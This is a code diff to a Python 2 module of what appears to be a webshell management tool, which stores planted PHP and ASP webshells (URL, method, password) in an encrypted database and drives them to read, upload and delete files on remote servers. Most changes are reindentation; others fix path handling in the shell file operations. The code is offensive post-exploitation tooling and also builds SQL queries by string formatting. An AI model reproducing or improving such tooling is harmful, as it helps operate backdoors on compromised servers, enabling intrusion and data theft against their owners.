@@ -39,66 +39,66 @@ def PasswordChange(newPass):
     DbCommit()
 
 def AddGroup(name):
-	DbCur.execute("insert into SGroup values('%s');" % name)
-	DbCommit()
-	print "Shells group successfully added."
+    DbCur.execute("insert into SGroup values('%s');" % name)
+    DbCommit()
+    print "Shells group successfully added."
 
 def AddShell():
-	group = raw_input("Group(default):")
-	if group == '': group = "default"
-	DbCur.execute("select * from SGroup where name='%s';" % group)
-	if DbCur.fetchone() == None:
-		print "Error! group not found."
-		return
-	name = raw_input("Name:")
-	if name == '':
-		print "Error! Can not be empty."
-		return
+    group = raw_input("Group(default):")
+    if group == '': group = "default"
+    DbCur.execute("select * from SGroup where name='%s';" % group)
+    if DbCur.fetchone() == None:
+        print "Error! group not found."
+        return
+    name = raw_input("Name:")
+    if name == '':
+        print "Error! Can not be empty."
+        return
 
-	DbCur.execute("select * from Shell where name='%s';" % name)
-	if DbCur.fetchone() != None:
-		print "Error! Name already exists."
-		return
+    DbCur.execute("select * from Shell where name='%s';" % name)
+    if DbCur.fetchone() != None:
+        print "Error! Name already exists."
+        return
 
-	url = raw_input("Url:")
-	if url == '':
-		print "Error! Can not be empty."
-		return
+    url = raw_input("Url:")
+    if url == '':
+        print "Error! Can not be empty."
+        return
 
-	method = raw_input("Method(POST/GET):")
-	method = method.upper()
-	if method != "GET" and method != "POST":
-		print "Error! Method"
-		return
-	
-	stype = raw_input("Type(PHP/ASP):")
-	stype = stype.upper()
-	if stype != "PHP" and stype != "ASP":
-		print "Error! Type"
-		return
-	password = raw_input("Password:")
-	if password == '':
-		print "Error! Can not be empty."
-		return
-	
+    method = raw_input("Method(POST/GET):")
+    method = method.upper()
+    if method != "GET" and method != "POST":
+        print "Error! Method"
+        return
+    
+    stype = raw_input("Type(PHP/ASP):")
+    stype = stype.upper()
+    if stype != "PHP" and stype != "ASP":
+        print "Error! Type"
+        return
+    password = raw_input("Password:")
+    if password == '':
+        print "Error! Can not be empty."
+        return
+    
 
-	DbCur.execute("insert into Shell values(NULL,'%s','%s','%s','%s','%s', '%s');" % (name, group, url, method, stype, password))
-	DbCommit()
-	print "Shell successfully added."
+    DbCur.execute("insert into Shell values(NULL,'%s','%s','%s','%s','%s', '%s');" % (name, group, url, method, stype, password))
+    DbCommit()
+    print "Shell successfully added."
 
 def DelGroup(name):
-	DbCur.execute("delete from SGroup where name='%s';" % name)
-	DbCommit()
-	print "Shells group successfully deleted."
+    DbCur.execute("delete from SGroup where name='%s';" % name)
+    DbCommit()
+    print "Shells group successfully deleted."
 
 def ShowGroups():
-	for c in DbCur.execute("select * from SGroup;"):
-		print c[0]
+    for c in DbCur.execute("select * from SGroup;"):
+        print c[0]
 
 
 def ShowShells():
-	for c in DbCur.execute("select * from Shell;"):
-		print "ID:%s Name:%s  Group:%s  Url:%s  Method:%s  Type:%s" % (c[0],c[1],c[2],c[3],c[4],c[5])
+    for c in DbCur.execute("select * from Shell;"):
+        print "ID:%s Name:%s  Group:%s  Url:%s  Method:%s  Type:%s" % (c[0],c[1],c[2],c[3],c[4],c[5])
 
 
 def Shell_Info_PHP():
@@ -282,7 +282,7 @@ def Shell_Cmd(cmd):
         return Shell_Cmd_ASP(cmd)
     else:
         print "Faild type!"
-	
+    
 
 def Shell_Cmd_Exit():
     Core.Command.CommandList = MainCommandList
@@ -379,7 +379,7 @@ def Shell_List():
 def Shell_Read_PHP(filename):
     if System == "Windows":
         if filename.find(":") < 0:
-            filename = Pwd + filename
+            filename = Pwd + "\\" + filename
     else:
         if filename[0:1] != "/":
             filename = Pwd + "/" + filename
@@ -448,7 +448,7 @@ def Shell_Read(filename):
 def Shell_Up_PHP(filename,localfile):
     if System == "Windows":
         if filename.find(":") < 0:
-            filename = Pwd + filename
+            filename = Pwd + "\\" + filename
     else:
         if filename[0:1] != "/":
             filename = Pwd + "/" + filename
@@ -546,6 +546,13 @@ def Shell_Up(filename, localfile):
         print "Upload faild!"
 
 def Shell_Del(filename):
+    if System == "Windows":
+        if filename.find(":") < 0:
+            filename = Pwd + "\\" + filename
+    else:
+        if filename[0:1] != "/":
+            filename = Pwd + "/" + filename
+
     php_head = Core.Config.GetConfig("SM","shellcode","php_head")
     php_tail = Core.Config.GetConfig("SM","shellcode","php_tail")
     shellcode = Shell_Pass + "=" + urllib.quote(php_head)
@@ -582,21 +589,21 @@ def OtherCommand(command):
     
 
 def UseShell(argv):
-	DbCur.execute("select * from Shell where id='%s'" % argv)
-	r = DbCur.fetchone()
-	if r == None:
-		DbCur.execute("select * from Shell where name='%s'" % argv)
-		r = DbCur.fetchone()
-	
-	if r != None:
+    DbCur.execute("select * from Shell where id='%s'" % argv)
+    r = DbCur.fetchone()
+    if r == None:
+        DbCur.execute("select * from Shell where name='%s'" % argv)
+        r = DbCur.fetchone()
+    
+    if r != None:
             global Shell_Url
             global Shell_Method
             global Shell_Type
             global Shell_Pass
-	    Shell_Url = r[3]
-	    Shell_Method = r[4]
-    	    Shell_Type = r[5]
-	    Shell_Pass = r[6]
+            Shell_Url = r[3]
+            Shell_Method = r[4]
+            Shell_Type = r[5]
+            Shell_Pass = r[6]
             global System
             System = ""
             Shell_Info()
@@ -620,44 +627,46 @@ def UseShell(argv):
                 Core.Controller.Prompt = Pwd + "$"
 
 def DataInit():
-	global DbConn
-	global DbCur
-        global Password
-        import getpass
-        DelCache()
+    global DbConn
+    global DbCur
+    global Password
+    import getpass
+    DelCache()
 
-        if os.path.exists("./Data/shells.db"):
+    if os.path.exists("./Data/shells.db"):
+        Password = getpass.getpass()
+        Core.Rc4.Rc4File("./Data/shells.db", "./Data/shells_d.db", Password)
+        DbConn = sqlite3.connect("./Data/shells_d.db")
+        DbCur = DbConn.cursor()
+        try:
+            DbCur.execute("select * from SGroup;")
+        except Exception, e:
+            print "Password error!"
+            Core.Controller.Exit()
+
+    else:
+        DbConn = sqlite3.connect("./Data/shells_d.db")
+        DbCur = DbConn.cursor()
+        #Database init
+        DbCur.execute("create table SGroup(name text);")
+        DbCur.execute("create table Shell(id INTEGER PRIMARY KEY, name text UNIQUE, sgroup text, url text, method varchar(5), stype varchar(5), pass text);")
+        DbCur.execute("insert into SGroup values('default');")
+        while True:
             Password = getpass.getpass()
-            Core.Rc4.Rc4File("./Data/shells.db", "./Data/shells_d.db", Password)
-            DbConn = sqlite3.connect("./Data/shells_d.db")
-            DbCur = DbConn.cursor()
-            try:
-                DbCur.execute("select * from SGroup;")
-            except Exception, e:
-                print "Password error!"
-                Core.Controller.Exit()
+            if Password != None:
+                break
 
-        else:
-            DbConn = sqlite3.connect("./Data/shells_d.db")
-            DbCur = DbConn.cursor()
-            #Database init
-            DbCur.execute("create table SGroup(name text);")
-	    DbCur.execute("create table Shell(id INTEGER PRIMARY KEY, name text UNIQUE, sgroup text, url text, method varchar(5), stype varchar(5), pass text);")
-	    DbCur.execute("insert into SGroup values('default');")
+        DbCommit()
 
-            while True:
-                Password = getpass.getpass()
-                if Password != None:
-                    break
-            DbCommit()
+
 
 def Init():
-	Core.Controller.InitFuns.append(DataInit)
-	Core.Command.CommandAdd("add group",AddGroup, "Add shell group.\r\n   Use:add group [name]")
-	Core.Command.CommandAdd("add shell", AddShell, "Add shell")
-	Core.Command.CommandAdd("show groups", ShowGroups, "Show the shell groups")
-	Core.Command.CommandAdd("show shells", ShowShells, "Show the shells list")
-	Core.Command.CommandAdd("del group", DelGroup, "Delete the group")
-	Core.Command.CommandAdd("use shell", UseShell, "Use the shell\r\n   Use:use shell [id|name]")
-        Core.Command.CommandAdd("pass", PasswordChange, "Change the passsword\r\n   Use:pass newpassword")
-        Core.Controller.ExitFuns.append(DelCache)	
+    Core.Controller.InitFuns.append(DataInit)
+    Core.Command.CommandAdd("add group",AddGroup, "Add shell group.\r\n   Use:add group [name]")
+    Core.Command.CommandAdd("add shell", AddShell, "Add shell")
+    Core.Command.CommandAdd("show groups", ShowGroups, "Show the shell groups")
+    Core.Command.CommandAdd("show shells", ShowShells, "Show the shells list")
+    Core.Command.CommandAdd("del group", DelGroup, "Delete the group")
+    Core.Command.CommandAdd("use shell", UseShell, "Use the shell\r\n   Use:use shell [id|name]")
+    Core.Command.CommandAdd("pass", PasswordChange, "Change the passsword\r\n   Use:pass newpassword")
+    Core.Controller.ExitFuns.append(DelCache)
